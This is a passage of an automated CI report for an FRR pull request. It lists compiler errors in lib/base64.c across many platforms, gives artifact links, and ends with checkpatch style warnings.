script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U1804AMD64/config.status/config.status\nUbuntu 18.04 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U1804AMD64/config.log/config.log.gz\n</details>\n<details>\n<summary>Ubuntu 18.04 i386 build: Failed (click for details)</summary>\nUbuntu 18.04 i386 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U18I386BUILD/config.log/config.log.gz\nUbuntu 18.04 i386 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U18I386BUILD/config.status/config.status\n\n__Make failed for Ubuntu 18.04 i386 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U18I386BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\n</details>\n<details>\n<summary>Redhat 8 amd64 build: Failed (click for details)</summary>\nRedhat 8 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/REDHAT8/config.log/config.log.gz\n\n__Make failed for Redhat 8 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/REDHAT8/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nRedhat 8 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/REDHAT8/config.status/config.status\n</details>\n<details>\n<summary>NetBSD 9 amd64 build: Failed (click for details)</summary>\nNetBSD 9 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/CI012BUILD/config.log/config.log.gz\n\n__Make failed for NetBSD 9 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/CI012BUILD/ErrorLog/log_make.txt)\n\n    gmake[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function 'base64_encode_block':\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function 'base64_decode_block':\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nNetBSD 9 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/CI012BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 20.04 amd64 build: Failed (click for details)</summary>\nUbuntu 20.04 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U2004AMD64BUILD/config.status/config.status\n\n__Make failed for Ubuntu 20.04 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U2004AMD64BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nUbuntu 20.04 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U2004AMD64BUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>Ubuntu 18.04 ppc64le build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 ppc64le build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U1804PPC64LEBUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:125:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:157:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:168:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:180:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:192:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_encode_block:\n\nUbuntu 18.04 ppc64le build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U1804PPC64LEBUILD/config.status/config.status\nUbuntu 18.04 ppc64le build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U1804PPC64LEBUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>FreeBSD 12 amd64 build: Failed (click for details)</summary>\n\n__Make failed for FreeBSD 12 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/FBSD12AMD64/ErrorLog/log_make.txt)\n\n    gmake[1]: Entering directory '/usr/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function 'base64_encode_block':\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function 'base64_decode_block':\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nFreeBSD 12 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/FBSD12AMD64/config.status/config.status\nFreeBSD 12 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/FBSD12AMD64/config.log/config.log.gz\n</details>\n<details>\n<summary>Ubuntu 18.04 arm7 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 arm7 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U18ARM7BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:125:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:157:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:168:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:180:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:192:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_encode_block:\n\nUbuntu 18.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U18ARM7BUILD/config.log/config.log.gz\nUbuntu 18.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U18ARM7BUILD/config.status/config.status\n</details>\n<details>\n<summary>Fedora 29 amd64 build: Failed (click for details)</summary>\n\n__Make failed for Fedora 29 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/F29BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nFedora 29 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/F29BUILD/config.status/config.status\nFedora 29 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/F29BUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>Ubuntu 18.04 arm8 build: Failed (click for details)</summary>\nUbuntu 18.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U18ARM8BUILD/config.status/config.status\nUbuntu 18.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U18ARM8BUILD/config.log/config.log.gz\n\n__Make failed for Ubuntu 18.04 arm8 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U18ARM8BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:125:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:157:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:168:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:180:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:192:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_encode_block:\n\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Ubuntu 16.04 i386 build\n- Ubuntu 16.04 amd64 build\n- OpenBSD 7 amd64 build\n- CentOS 7 amd64 build\n- Debian 9 amd64 build\n</details>\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n<details>\n<summary>FreeBSD 11 amd64 build: Failed (click for details)</summary>\n\n__Make failed for FreeBSD 11 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/CI009BUILD/ErrorLog/log_make.txt)\n\n    /usr/home/ci/cibuild.3563/frr-source/doc/user/zebra.rst:1380: WARNING: duplicate clicmd description of debug zebra pbr, other instance in pbr\n    lib/base64.c: In function 'base64_encode_block':\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function 'base64_decode_block':\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nFreeBSD 11 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/CI009BUILD/config.status/config.status\nFreeBSD 11 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/CI009BUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>Debian 10 amd64 build: Failed (click for details)</summary>\nDebian 10 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/DEB10BUILD/config.log/config.log.gz\n\n__Make failed for Debian 10 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/DEB10BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nDebian 10 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/DEB10BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 16.04 arm7 build: Failed (click for details)</summary>\nUbuntu 16.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/CI101BUILD/config.status/config.status\nUbuntu 16.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/CI101BUILD/config.log/config.log.gz\n\n__Make failed for Ubuntu 16.04 arm7 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/CI101BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:125:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:157:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:168:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:180:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:192:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n\n</details>\n<details>\n<summary>Debian 11 amd64 build: Failed (click for details)</summary>\nDebian 11 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/DEB11AMD64/config.status/config.status\n\n__Make failed for Debian 11 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/DEB11AMD64/ErrorLog/log_make.txt)\n\n    /home/ci/cibuild.3563/frr-source/doc/user/zebra.rst:1380: WARNING: duplicate clicmd description of debug zebra pbr, other instance in pbr\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nDebian 11 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/DEB11AMD64/config.log/config.log.gz\n</details>\n<details>\n<summary>Ubuntu 16.04 arm8 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 16.04 arm8 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U16ARM8BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:125:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:157:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:168:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:180:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:192:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n\nUbuntu 16.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U16ARM8BUILD/config.log/config.log.gz\nUbuntu 16.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U16ARM8BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 18.04 amd64 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U1804AMD64/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nUbuntu 18.04 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U1804AMD64/config.status/config.status\nUbuntu 18.04 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U1804AMD64/config.log/config.log.gz\n</details>\n<details>\n<summary>Ubuntu 18.04 i386 build: Failed (click for details)</summary>\nUbuntu 18.04 i386 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U18I386BUILD/config.log/config.log.gz\nUbuntu 18.04 i386 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U18I386BUILD/config.status/config.status\n\n__Make failed for Ubuntu 18.04 i386 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U18I386BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\n</details>\n<details>\n<summary>Redhat 8 amd64 build: Failed (click for details)</summary>\nRedhat 8 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/REDHAT8/config.log/config.log.gz\n\n__Make failed for Redhat 8 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/REDHAT8/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nRedhat 8 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/REDHAT8/config.status/config.status\n</details>\n<details>\n<summary>NetBSD 9 amd64 build: Failed (click for details)</summary>\nNetBSD 9 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/CI012BUILD/config.log/config.log.gz\n\n__Make failed for NetBSD 9 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/CI012BUILD/ErrorLog/log_make.txt)\n\n    gmake[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function 'base64_encode_block':\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function 'base64_decode_block':\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nNetBSD 9 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/CI012BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 20.04 amd64 build: Failed (click for details)</summary>\nUbuntu 20.04 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U2004AMD64BUILD/config.status/config.status\n\n__Make failed for Ubuntu 20.04 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U2004AMD64BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nUbuntu 20.04 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U2004AMD64BUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>Ubuntu 18.04 ppc64le build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 ppc64le build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U1804PPC64LEBUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:125:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:157:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:168:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:180:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:192:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_encode_block:\n\nUbuntu 18.04 ppc64le build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U1804PPC64LEBUILD/config.status/config.status\nUbuntu 18.04 ppc64le build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U1804PPC64LEBUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>FreeBSD 12 amd64 build: Failed (click for details)</summary>\n\n__Make failed for FreeBSD 12 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/FBSD12AMD64/ErrorLog/log_make.txt)\n\n    gmake[1]: Entering directory '/usr/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function 'base64_encode_block':\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function 'base64_decode_block':\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nFreeBSD 12 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/FBSD12AMD64/config.status/config.status\nFreeBSD 12 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/FBSD12AMD64/config.log/config.log.gz\n</details>\n<details>\n<summary>Ubuntu 18.04 arm7 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 arm7 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U18ARM7BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:125:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:157:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:168:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:180:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:192:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_encode_block:\n\nUbuntu 18.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U18ARM7BUILD/config.log/config.log.gz\nUbuntu 18.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U18ARM7BUILD/config.status/config.status\n</details>\n<details>\n<summary>Fedora 29 amd64 build: Failed (click for details)</summary>\n\n__Make failed for Fedora 29 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/F29BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nFedora 29 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/F29BUILD/config.status/config.status\nFedora 29 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/F29BUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>Ubuntu 18.04 arm8 build: Failed (click for details)</summary>\nUbuntu 18.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U18ARM8BUILD/config.status/config.status\nUbuntu 18.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U18ARM8BUILD/config.log/config.log.gz\n\n__Make failed for Ubuntu 18.04 arm8 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3563/artifact/U18ARM8BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3563/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:125:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:157:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:168:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:180:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:192:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_encode_block:\n\n</details>\n\n    <stdin>:281: new blank line at EOF.\n    +\n    warning: 1 line adds whitespace errors.\n    Report for base64.c | 93 issues\n    ===============================================\n    WARNING: Block comments use * on subsequent lines\n    #2: FILE: /tmp/f1-18189/base64.c:2:\n    +/*\n    +This is part of the libb64 project, and has been placed in the public domain.\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #10: FILE: /tmp/f1-18189/base64.c:10:\n    +void base64_init_encodestate(base64_encodestate* state_in)\n    \n    WARNING: line over 80 characters\n    #19: FILE: /tmp/f1-18189/base64.c:19:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    \n    ERROR: \"foo* bar\" should be \"foo *bar\"\n    #19: FILE: /tmp/f1-18189/base64.c:19:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    \n    WARNING: Missing a blank line after declarations\n    #20: FILE: /tmp/f1-18189/base64.c:20:\n    +\tstatic const char* encoding = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n    +\tif (value_in > 63) return '=';\n    \n    ERROR: trailing statements should be on next 